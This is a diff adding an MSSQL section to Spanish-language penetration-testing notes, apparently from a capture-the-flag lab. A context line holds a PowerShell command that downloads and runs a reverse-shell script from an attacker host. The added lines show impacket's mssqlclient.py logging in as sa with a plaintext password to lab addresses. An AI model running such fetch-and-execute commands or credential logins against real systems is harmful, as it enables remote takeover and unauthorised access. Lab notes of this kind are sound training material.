@@ -1448,6 +1448,18 @@ Y la que por lo que entiendo carga ya el codigo en la memoria
 powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/Invoke-PowerShellTcp.ps1')
 ```
 
+## Microsoft SQL server
+
+Para conectarse desde Kali existe un script en python de impacket
+
+```
+mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59
+
+/usr/share/doc/python3-impacket/examples/mssqlclient.py  WORKGROUP/sa:GWE3V65#6KFH93@4GWTG2G@10.129.1.183
+
+
+```
+
 ### Certutil 
 
 Esta herramienta es altamente detectada por windows ten cuidado...
